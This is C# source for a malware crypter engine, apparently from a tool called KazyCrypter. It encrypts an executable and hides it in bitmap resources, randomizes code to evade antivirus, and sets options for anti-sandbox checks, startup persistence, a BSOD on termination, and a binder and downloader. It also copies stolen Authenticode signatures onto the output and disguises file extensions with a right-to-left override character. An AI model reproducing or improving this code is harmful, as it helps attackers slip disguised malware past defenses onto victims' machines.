﻿using Microsoft.CSharp;
using Microsoft.VisualBasic;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace CryptEngine
{
    public class CryptEngine
    {
        private static CryptData data;
        private static Process resproc;
        private static Random r;
        private static bool confused;

        public static bool Crypt(object cdata)
        {
            r = new Random();
            data = ConvertClass(cdata);
            resproc = new Process();
            resproc.StartInfo.CreateNoWindow = true;
            resproc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            resproc.StartInfo.FileName = "res.exe";

            AddMessage("CryptEngine initialized!");

            try
            {
                File.Copy(data.MainFile, "main.exe", true);
            }
            catch
            {
                AddMessage("Please select a valid Main File!", true);
                return false;
            }

            AddMessage("Creating settings file...");
            ResourceWriter w = new ResourceWriter("STUB.resources");

            if (data.CompVer)
            {
                AddMessage("Deleting VersionInfo...");
                ResProc("-delete main.exe, main.exe, VERSIONINFO,,");
            }
            if (data.CompUPX)
            {
                AddMessage("Compressing using UPX...");
                Process p = new Process();
                p.StartInfo.FileName = "upx.exe";
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.Arguments = "main.exe --best";
                p.Start();
                p.WaitForExit();
            }
            AddMessage("Reading main file...");
            byte[] mainfile = File.ReadAllBytes("main.exe");
        
            w.AddResource("CompGZIP", data.CompGzip);
            if (data.CompGzip)
            {
                AddMessage("Compressing using GZip");
                using (MemoryStream mst = new MemoryStream())
                {
                    using (GZipStream gst = new GZipStream(mst, CompressionMode.Compress))
                        gst.Write(mainfile, 0, mainfile.Length);
                    mainfile = mst.ToArray();
                }
            }

            AddMessage("Adding main file...");
            w.AddResource("MAIN", mainfile);
            w.AddResource("TASK", Properties.Resources.task);

            AddMessage("Writing injection settings...");
            w.AddResource("ForceNet", data.ForceNet);
            w.AddResource("InjectLoc", data.InjectLoc);

            AddMessage("Writing anti settings...");
            w.AddResource("AntiSandboxie", data.AntiSandboxie);
            w.AddResource("AntiWS", data.AntiWS);
            w.AddResource("AntiEmulation", data.AntiEmulation);
            w.AddResource("AntiWPE", data.AntiWPE);

            AddMessage("Writing message settings...");
            w.AddResource("MessageEnabled", data.MessageEnabled);
            w.AddResource("MessageTitle", data.MessageTitle);
            w.AddResource("MessageText", data.MessageText);
            w.AddResource("MessageIconID", data.MessageIconID);
            w.AddResource("MessageButtonID", data.MessageButtonID);
            w.AddResource("MessageAlways", data.MessageAlways);

            AddMessage("Writing startup settings...");
            w.AddResource("StartupEnabled", data.StartupEnabled);
            w.AddResource("StartupEntryName", data.StartupEntryName);
            w.AddResource("StartupFileName", data.StartupFileName);
            w.AddResource("StartupLocation", data.StartupLocation);
            w.AddResource("StartupMeltEnabled", data.StartupMeltEnabled);

            AddMessage("Writing ZoneID settings...");
            w.AddResource("DeleteZoneID", data.DeleteZoneID);

            AddMessage("Writing delay settings");
            w.AddResource("DelayEnabled", data.DelayEnabled);
            try
            {
                w.AddResource("DelayAmount", int.Parse(data.DelayAmount));
            }
            catch
            {
                AddMessage("Please enter a correct Delay Value!", true);
                return false;
            }

            AddMessage("Writing CMD settings...");
            w.AddResource("CMDArguments", data.CMDArguments);

            AddMessage("Writing binder, downloader settings...");
            int dl = 0, bd = 0;
            foreach (string[] s in data.BinderDownloader)
                if (s[0].StartsWith("http"))
                {
                    object[] toadd = new object[4];
                    toadd[0] = s[0];
                    toadd[1] = s[1];
                    toadd[2] = s[2];
                    try
                    {
                        toadd[3] = int.Parse(s[3]);
                    }
                    catch
                    {
                        AddMessage("Please enter a correct Delay in B&D!", true);
                        return false;
                    }
                    w.AddResource("DOWN" + dl.ToString(), toadd);
                    dl++;
                }
                else
                {
                    object[] toadd = new object[5];
                    try
                    {
                        toadd[0] = File.ReadAllBytes(s[0]);
                    }
                    catch
                    {
                        AddMessage("Please select a valid file in B&D!", true);
                        return false;
                    }
                    toadd[1] = s[1];
                    toadd[2] = s[2];
                    try
                    {
                        toadd[3] = int.Parse(s[3]);
                    }
                    catch
                    {
                        AddMessage("Please enter a correct Delay in B&D!", true);
                        return false;
                    }
                    toadd[4] = s[0].Substring(s[0].LastIndexOf("\\") + 1);
                    w.AddResource("BIND" + bd.ToString(), toadd);
                    bd++;
                }
            w.AddResource("DL", dl);
            w.AddResource("BD", bd);

            AddMessage("Writing protection settings...");
            w.AddResource("ProcessPersistence", data.ProcessPersistence);
            w.AddResource("StartupPersistence", data.StartupPersistence);
            w.AddResource("ElevatedProcess", data.ElevatedProcess);
            w.AddResource("BSOD", data.BSOD);
            w.AddResource("HideFile", data.HideFile);
            w.AddResource("HideFolder", data.HideFolder);

            AddMessage("Writing creation date settings...", false);
            w.AddResource("CreationDateEnabled", data.CreationDateEnabled);
            w.AddResource("CreationDateValue", data.CreationDateValue);

            AddMessage("Settings done!");
            AddMessage(Environment.NewLine + "Compiling stub.exe...");

            w.Generate();
            w.Close();

#if DEBUG
            string source = File.ReadAllText(Application.StartupPath + "\\Data\\stub.txt");
#else
            string source = Properties.Resources.stub;
#endif
            if (!CompileSource(source, "stub.exe", "STUB.resources", data.DotNetVersion.Replace(".Net ", ""), "", "System.dll", "System.Windows.Forms.dll"))
                return false;
            AddMessage("Compiling done!");
            ResProc("-delete stub.exe, stub.exe, VERSIONINFO,,");

            //AddMessage("Obfuscating stub.exe...");
            //if (!Confuse("stub.exe", data.CompUSG))
            //{
            //    AddMessage("Couldn't obfuscate stub.exe!", true);
            //    return false;
            //}
            AddMessage("Obfuscation done!");

            AddMessage("Generating random values...");
            string resname = RandomString(r.Next(10, 20));
            string imgname = RandomString(r.Next(10, 20));
            string keyname = RandomString(r.Next(10, 20));
            byte[] key;

            AddMessage(Environment.NewLine + "Generating loader resource...");
            w = new ResourceWriter(resname + ".resources");

            AddMessage("Reading stub...");
            byte[] stubdata = File.ReadAllBytes("stub.exe");

            if (data.PumperEnabled)
            {
                AddMessage("Pumping file...");
                try
                {
                    byte[] pump = new byte[int.Parse(data.PumperAmount) * 1024];
                    r.NextBytes(pump);
                    Array.Resize(ref stubdata, stubdata.Length + pump.Length);
                    Array.Copy(pump, 0, stubdata, stubdata.Length - pump.Length, pump.Length);
                }
                catch
                {
                    AddMessage("Please enter a valid Pump amount!", true);
                    return false;
                }
            }

            AddMessage("Reversing data...");
            Array.Reverse(stubdata);
            AddMessage("Encrypting stub using Rijndael");
            stubdata = EncryptData(stubdata, out key);
            AddMessage("Splitting stub...");
            List<byte[]> stubsplit = SplitByte(stubdata, 1000, 10000);
            AddMessage("Encrypting stub using Stenography...");
            //Bitmap bmp = ByteToBitmap(stubdata);

            AddMessage("Writing data...");
            //w.AddResource(imgname, bmp);
            for (int i = 0; i < stubsplit.Count; i++)
                w.AddResource(imgname + i.ToString(), ByteToBitmap(stubsplit[i]));
            w.AddResource(keyname, key);
            w.Generate();
            w.Close();

            string filename = data.TargetFile.Substring(data.TargetFile.LastIndexOf("\\") + 1);

            AddMessage("Writing values to loader...");
#if DEBUG
            source = File.ReadAllText(Application.StartupPath + "\\Data\\loader.txt");
#else
            source = Properties.Resources.loader;
#endif
            source = source.Replace("%RESNAME%", resname);
            source = source.Replace("%IMGNAME%", imgname);
            source = source.Replace("%IMGNUM%", stubsplit.Count.ToString());
            source = source.Replace("%KEYNAME%", keyname);

            AddMessage("Writing assembly infos...");
            if (data.DefaultAssembly)
                source = source.Replace("%ASSEMBLYINFO%", "");
            else
            {
                string ass = Properties.Resources.AssemblyInfo;
                ass = ass.Replace("%DESCRIPTION%", data.AssDescription);
                ass = ass.Replace("%TITLE%", data.AssTitle);
                ass = ass.Replace("%PRODUCT%", data.AssProduct);
                ass = ass.Replace("%COPYRIGHT%", data.AssCopyright);
                try
                {
                    string[] assd = data.AssVersion.Split('.');
                    ass = ass.Replace("%VERSION%", int.Parse(assd[0]).ToString() + "." + int.Parse(assd[1]).ToString() + "." + int.Parse(assd[2]).ToString() + "." + int.Parse(assd[3]).ToString());
                }
                catch
                {
                    AddMessage("Enter a valid Version please!", true);
                    return false;
                }
                try
                {
                    string[] assd = data.AssFileVersion.Split('.');
                    ass = ass.Replace("%FILEVERSION%", int.Parse(assd[0]).ToString() + "." + int.Parse(assd[1]).ToString() + "." + int.Parse(assd[2]).ToString() + "." + int.Parse(assd[3]).ToString());
                }
                catch
                {
                    AddMessage("Enter a valid FileVersion please!", true);
                    return false;
                }
                source = source.Replace("%ASSEMBLYINFO%", ass);
            }

            string iconpath = "";
            if (data.IconChangerEnabled)
            {
                AddMessage("Extracting icon...");
                if (data.IconPath.EndsWith(".ico"))
                    File.Copy(data.IconPath, "Icon_1.ico", true);
                else
                {
                    File.Copy(data.IconPath, "icon.exe", true);
                    ResProc("-extract icon.exe, res.rc, ICONGROUP,,");
                }

                if(File.Exists("Icon_1.ico"))
                    iconpath = "Icon_1.ico";
            }

            AddMessage("Writing delay settings...");
            if (data.DelayEnabled)
                try
                {
                    source = source.Replace("%SLEEPTIME%", (int.Parse(data.DelayAmount) * 1000).ToString());
                }
                catch
                {
                    AddMessage("Please enter a valid Delay amount!", true);
                    return false;
                }
            else
                source = source.Replace("%SLEEPTIME%", "0");

            AddMessage("Randomizing variables...");
            for (int i = 0; i < 100; i++)
                source = source.Replace("%VAR" + i.ToString() + "%", RandomString(r.Next(5, 8)));

            AddMessage("Randomizint method order...");
            source = ScrambleMethods(source);

            AddMessage("Compiling loader...");
            if (!CompileSource(source, filename, resname + ".resources", data.DotNetVersion.Replace(".Net ", ""), iconpath, "System.dll", "System.Drawing.dll", "System.Windows.Forms.dll", "Microsoft.VisualBasic.dll"))
                    return false;
            AddMessage("Compiling done!");

            if (data.CompVer)
            {
                AddMessage("Deleting VersionInfo...");
                ResProc("-delete " + filename + ", " + filename + ", VERSIONINFO,,");
            }

            if (data.FileClonerEnabled)
            {
                AddMessage("Cloning file...");
                ResProc("-delete " + filename + ", " + filename + ", VERSIONINFO,,");
                File.Copy(data.FileClonerPath, "clone.exe", true);
                ResProc("-extract clone.exe, clone.res, VERSIONINFO,,");
                ResProc("-add " + filename + ", " + filename + ", " + "clone.res, VERSIONINFO,,");
            }


            //AddMessage("Obfuscating loader...");
            //if (!Confuse(filename, false))
            //{
            //    AddMessage("Couldn't obfuscate loader!", true);
            //    return false;
            //}
            AddMessage("Obfuscation done!");

            if (data.SignatureStealerEnabled)
                try
                {
                    AddMessage("Stealing signature...");
                    byte[] sign = StealSign(data.SignatureStealerPath, data.SignatureX86);
                    if (sign.Length == 0)
                        throw new Exception("Bad signature.");
                    SignFile(filename, sign);
                }
                catch
                {
                    AddMessage("Please select a valid file for Signature stealer!\nTry to change x86/x64!", true);
                    return false;
                }

            if (data.ForceAdminManifest)
            {
                AddMessage("Adding UAC manifest...");
                AddUacManifest(filename);
            }

            byte[] eofdata = ReadEoF(data.MainFile);
            if (eofdata.Length != 0)
            {
                AddMessage("Writing EOF data...");
                FileStream fst = File.OpenWrite(filename);
                fst.Seek(0, SeekOrigin.End);
                fst.Write(eofdata, 0, eofdata.Length);
                fst.Close();
            }

            File.Copy(filename, data.TargetFile, true);

            if (data.ExtensionSpooferEnabled)
            {
                AddMessage("Spoofing extension...");
                SpoofExt(data.TargetFile, data.ExtensionSpooferValue);
            }


            return true;
        }

        private static string ScrambleMethods(string source)
        {
            List<string> methods = new List<string>();
            while (source.IndexOf("|") != -1)
            {
                string locmethod = source.Substring(source.IndexOf("|") + 1);
                locmethod = locmethod.Remove(locmethod.IndexOf("|"));
                methods.Add(locmethod);
                source = source.Replace("|" + locmethod + "|", "");
            }
            string loc = "";
            while (methods.Count != 0)
            {
                int rand = r.Next(methods.Count);
                loc += methods[rand];
                methods.RemoveAt(rand);
            }
            return source.Replace("%METHODS%", loc);
        }

        private static List<byte[]> SplitByte(byte[] data, int min, int max)
        {
            List<byte[]> ret = new List<byte[]>();
            byte[] buf;
            int length = data.Length;
            while (length != 0)
            {
                int curl = r.Next(min, max + 1);
                if (curl > length)
                    curl = length;
                buf = new byte[curl];
                Array.Copy(data, data.Length - length, buf, 0, curl);
                ret.Add(buf);
                length -= curl;
            }
            return ret;
        }

        private static byte[] BitmapToByte(Bitmap bmp)
        {
            BitmapData bdata = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadOnly, bmp.PixelFormat);
            byte[] ret = new byte[4];
            Marshal.Copy(bdata.Scan0, ret, 0, 4);
            ret = new byte[BitConverter.ToUInt32(ret, 0)];
            Marshal.Copy((IntPtr)((int)bdata.Scan0 + 4), ret, 0, ret.Length);
            bmp.UnlockBits(bdata);
            return ret;
        }

        private static byte[] EncryptData(byte[] enc, out byte[] key)
        {
            RijndaelManaged rm = new RijndaelManaged();
            rm.GenerateKey();
            key = rm.Key;
            return rm.CreateEncryptor().TransformFinalBlock(enc, 0, enc.Length);
        }

        private static Bitmap ByteToBitmap(byte[] data)
        {
            int size = (int)Math.Ceiling(Math.Sqrt(Math.Ceiling((double)data.Length / 4d) + 1));
            Bitmap bmp = new Bitmap(size, size, PixelFormat.Format32bppArgb);
            BitmapData bdata = bmp.LockBits(new Rectangle(0, 0, size, size), ImageLockMode.ReadWrite, bmp.PixelFormat);
            Marshal.Copy(BitConverter.GetBytes(data.Length), 0, bdata.Scan0, 4);
            Marshal.Copy(data, 0, (IntPtr)((int)bdata.Scan0 + 4), data.Length);
            bmp.UnlockBits(bdata);
            return bmp;
        }

        private static string RandomString(int Length)
        {
            string chars = "qwertzuiopasdfghjklyxcvbnmQWERTZUIOPASDFGHJKLYXCVBNM";
            string ret = "";
            for (int i = 0; i < Length; i++)
                ret += chars[r.Next(chars.Length)];
            return ret;
        }

        //       private static bool Confuse(string filename, bool compression)
        //         {
        //            confused = true;
        //            Process confuserproc = new Process();
        //            confuserproc.StartInfo.CreateNoWindow = true;
        //            confuserproc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        //            confuserproc.StartInfo.FileName = "confuser\\Confuser.CLI.exe";
        //            confuserproc.StartInfo.UseShellExecute = false;
        //            confuserproc.StartInfo.RedirectStandardOutput = true;
        //            confuserproc.OutputDataReceived += Confuserproc_OutputDataReceived;
        //
        //#if DEBUG
        //            string s = File.ReadAllText("E:\\Dropbox\\KazyCrypter\\CryptEngine\\Resources\\cproject.txt");
        //#else
        //            string s = Properties.Resources.cproject;
        //#endif
        //            s = s.Replace("%RESLOC%", Directory.GetCurrentDirectory()).Replace("%FILENAME%", filename);
        //            if (compression)
        //                s = s.Insert(s.IndexOf("\n") + 1, "<packer id = \"compressor\" //>");
        //            File.WriteAllText("project.crproj", s);
        //            confuserproc.StartInfo.Arguments = "project.crproj -n";
        //            confuserproc.Start();
        //            confuserproc.BeginOutputReadLine();
        //            confuserproc.WaitForExit();
        //            return confused;
        //        }

        //        private static void Confuserproc_OutputDataReceived(object sender, DataReceivedEventArgs e)
        //        {
        //            if (e != null)
        //                if (e.Data != null)
        //                {
        //                    if (e.Data.Contains("[ERROR]"))
        //                        confused = false;
        //                }
        //        }

        private static void AddUacManifest(string path)
        {
            Process cp = new Process();
            cp.StartInfo.FileName = "mt.exe";
            cp.StartInfo.Arguments = "-manifest uac.manifest -outputresource:" + path;
            cp.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            cp.StartInfo.CreateNoWindow = true;
            cp.Start();
            cp.WaitForExit();
        }

        private static byte[] ReadEoF(string fileName)
        {
            byte[] buffer = null;
            using (FileStream fs = new FileStream(fileName, FileMode.Open))
            {
                buffer = new byte[4];
                fs.Position = 0x3C;
                fs.Read(buffer, 0, 4);
                fs.Position = BitConverter.ToInt32(buffer, 0) + 0x6;
                buffer = new byte[2];
                fs.Read(buffer, 0, 2);
                fs.Position += 0x100 + ((BitConverter.ToInt16(buffer, 0) - 1) * 0x28);
                buffer = new byte[8];
                fs.Read(buffer, 0, 8);
                fs.Position = BitConverter.ToInt32(buffer, 0) + BitConverter.ToInt32(buffer, 4);
                buffer = new byte[fs.Length - fs.Position];
                fs.Read(buffer, 0, buffer.Length);
            }
            return buffer;
        }

        private static void SignFile(string Output, byte[] cert)
        {
            int iFile = 0;
            int LByteLen = 0;
            byte bytData = 0;
            string sHex = String.Empty;
            iFile = FileSystem.FreeFile();
            FileSystem.FileOpen(iFile, Output, Microsoft.VisualBasic.OpenMode.Binary);
            LByteLen = (int)FileSystem.LOF(iFile);
            FileSystem.FileGet(iFile, ref bytData, 61);
            FileSystem.FilePut(iFile, LByteLen, bytData + 153);
            FileSystem.FilePut(iFile, cert.Length, bytData + 157);
            FileSystem.FileClose(new int[] { iFile });
            byte[] data = File.ReadAllBytes(Output);
            Array.Resize(ref data, data.Length + cert.Length);
            Array.Copy(cert, 0, data, data.Length - cert.Length, cert.Length);
            File.WriteAllBytes(Output, data);
        }

        private static byte[] StealSign(string The_File, bool x86)
        {
            byte[] TheCert = null;
            string SavFile = String.Empty;
            int iFile = 0;
            int bytData = 0;
            int CertPointer = 0;
            int CertLength = 0;
            if (!x86)
            {
                // x64
                iFile = FileSystem.FreeFile();
                FileSystem.FileOpen(iFile, The_File, Microsoft.VisualBasic.OpenMode.Binary);
                FileSystem.FileGet(iFile, ref bytData, 61);
                // get the CertPointer
                FileSystem.FileGet(iFile, ref CertPointer, bytData + 169);
                // get the CertLength
                FileSystem.FileGet(iFile, ref CertLength, bytData + 173);
                // MsgBox Hex(CertPointer)
                CertLength = CertLength - 1;
                TheCert = new byte[(int)(CertLength) + 1];
                //FileSystem.FileGet(iFile,ref TheCert, CertPointer + 1);
                FileSystem.FileClose(new int[] { iFile });
                Array.Copy(File.ReadAllBytes(The_File), CertPointer, TheCert, 0, TheCert.Length);
            }
            else
            {
                // x86
                iFile = FileSystem.FreeFile();
                FileSystem.FileOpen(iFile, The_File, Microsoft.VisualBasic.OpenMode.Binary);
                FileSystem.FileGet(iFile, ref bytData, 61);
                // get the CertPointer
                FileSystem.FileGet(iFile, ref CertPointer, bytData + 153);
                // get the CertLength
                FileSystem.FileGet(iFile, ref CertLength, bytData + 157);
                // MsgBox Hex(CertPointer)
                CertLength = CertLength - 1;
                TheCert = new byte[(int)(CertLength) + 1];
                //   FileSystem.FileGet(iFile, ref TheCert, CertPointer + 1);
                FileSystem.FileClose(new int[] { iFile });
                Array.Copy(File.ReadAllBytes(The_File), CertPointer, TheCert, 0, TheCert.Length);
            }
            // Save the cert to file
            return TheCert;
        }

        private static void SpoofExt(string filename, string newext)
        {
            string fname = filename.Substring(filename.LastIndexOf("\\"));
            string oname = fname.Remove(fname.IndexOf("."));
            string ext = fname.Substring(fname.IndexOf("."));
            char[] newextchars = newext.ToCharArray();
            Array.Reverse(newextchars);
            newext = "";
            foreach (char c in newextchars)
                newext += c.ToString();
            File.Move(filename, filename.Remove(filename.LastIndexOf("\\")) + oname + '\u202E' + newext + ext);
        }

        private static void ResProc(string args)
        {
            resproc.StartInfo.Arguments = args;
            resproc.Start();
            resproc.WaitForExit();
        }

        private static bool CompileSource(string source, string outname, string resname, string dotnet, string icopath, params string[] refs)
        {
            Dictionary<string, string> prov = new Dictionary<string, string>();
            prov.Add("CompilerVersion", dotnet);
            CSharpCodeProvider c = new CSharpCodeProvider(prov);

            CompilerParameters p = new CompilerParameters();
            p.GenerateExecutable = true;
            if (!string.IsNullOrEmpty(resname))
                p.EmbeddedResources.Add(resname);
            p.OutputAssembly = outname;
            foreach (string r in refs)
                p.ReferencedAssemblies.Add(r);
            p.CompilerOptions = (string.IsNullOrEmpty(icopath) ? "" : "/win32icon:" + icopath + " ") + "/platform:x86 /t:winexe /unsafe";
            CompilerErrorCollection errors = c.CompileAssemblyFromSource(p, source).Errors;
            if (errors.Count == 0)
                return true;
            else
            {
                AddMessage(Environment.NewLine + "Compiling failed:");
                foreach (CompilerError er in errors)
                    AddMessage("Line: " + er.Line + Environment.NewLine + er.ErrorText + Environment.NewLine, true);
                return false;
            }
        }

        private static void AddMessage(string text)
        {
            AddMessage(text, false);
        }

        private static void AddMessage(string text, bool error)
        {
            data.MessageMethod.Invoke(data.Form, new object[] { text, error });
        }

        private static CryptData ConvertClass(object cdata)
        {
            CryptData data = new CryptData();
            FieldInfo[] fi = cdata.GetType().GetFields();
            int i = 0;
            foreach (FieldInfo f in typeof(CryptData).GetFields())
                f.SetValue(data, fi[i++].GetValue(cdata));
            return data;
        }
    }

    public class CryptData
    {
        public string Username;
        public Form Form;
        public MethodInfo MessageMethod;

        public string MainFile;
        public string TargetFile;

        public bool ForceNet;
        public string InjectLoc;

        public bool AntiSandboxie;
        public bool AntiWS;
        public bool AntiEmulation;
        public bool AntiWPE;

        public bool CompUSG;
        public bool CompUPX;
        public bool CompGzip;
        public bool CompVer;

        public bool ForceAdminManifest;

        public bool IconChangerEnabled;
        public string IconPath;
        public bool FileClonerEnabled;
        public string FileClonerPath;

        public bool DefaultAssembly;
        public string AssTitle;
        public string AssProduct;
        public string AssCopyright;
        public string AssDescription;
        public string AssVersion;
        public string AssFileVersion;

        public bool MessageEnabled;
        public string MessageTitle;
        public string MessageText;
        public int MessageIconID;
        public int MessageButtonID;
        public bool MessageAlways;

        public bool StartupEnabled;
        public string StartupEntryName;
        public string StartupFileName;
        public string StartupLocation;
        public bool StartupMeltEnabled;

        public bool DeleteZoneID;

        public bool DelayEnabled;
        public string DelayAmount;

        public bool PumperEnabled;
        public string PumperAmount;

        public string CMDArguments;

        public string[][] BinderDownloader;

        public bool ProcessPersistence;
        public bool StartupPersistence;
        public bool ElevatedProcess;
        public bool BSOD;
        public bool HideFile;
        public bool HideFolder;

        public bool CreationDateEnabled;
        public DateTime CreationDateValue;

        public bool ExtensionSpooferEnabled;
        public string ExtensionSpooferValue;

        public bool SignatureStealerEnabled;
        public bool SignatureX86;
        public string SignatureStealerPath;

        public string DotNetVersion;
    }
}
